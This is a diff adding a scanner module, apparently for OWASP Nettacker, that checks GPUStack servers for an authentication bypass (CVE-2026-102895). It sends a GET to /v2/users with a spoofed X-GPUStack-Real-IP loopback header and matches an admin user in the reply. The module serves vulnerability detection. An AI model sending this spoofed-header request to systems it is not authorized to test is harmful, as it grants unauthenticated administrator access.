@@ -1,0 +1,69 @@
+info:
+  name: gpustack_cve_2026_102895_vuln
+  author: atul-upadhyay-7
+  severity: 9.8
+  description: |
+    GPUStack before v2.2.0 can grant unauthenticated administrator access
+    when a request is treated as coming from loopback and
+    force_auth_localhost is false. In embedded gateway mode, the
+    X-GPUStack-Real-IP header is trusted without verification.
+    This module sends a read-only GET to /v2/users with a loopback header
+    and checks for a JSON response containing an administrator user.
+    CVE-2026-102895 is in the CISA Known Exploited Vulnerabilities catalog.
+  reference:
+    - https://github.com/advisories/GHSA-gj9m-f8ph-pmhr
+    - https://nvd.nist.gov/vuln/detail/CVE-2026-102895
+    - https://www.cisa.gov/known-exploited-vulnerabilities-catalog
+    - https://github.com/gpustack/gpustack/releases/tag/v2.2.0
+  profiles:
+    - vuln
+    - http
+    - critical_severity
+    - cve
+    - cve2026
+    - cisa_kev
+    - gpustack
+    - auth_bypass
+
+payloads:
+  - library: http
+    steps:
+      - method: get
+        timeout: 5
+        allow_redirects: false
+        ssl: false
+        headers:
+          User-Agent: "{user_agent}"
+          Accept: "application/json"
+          X-GPUStack-Real-IP: "127.0.0.1"
+        url:
+          nettacker_fuzzer:
+            input_format: "{{schema}}://{target}:{{ports}}{{paths}}"
+            prefix: ""
+            suffix: ""
+            interceptors:
+            data:
+              schema:
+                - "http"
+                - "https"
+              ports:
+                - 80
+                - 443
+                - 30080
+                - 8080
+                - 8443
+              paths:
+                - "/v2/users"
+        response:
+          condition_type: and
+          conditions:
+            status_code:
+              regex: "^200$"
+              reverse: false
+            headers:
+              Content-Type:
+                regex: '(?i)^application/json(?:\s*;|$)'
+                reverse: false
+            content:
+              regex: '"is_admin"\s*:\s*true'
+              reverse: false
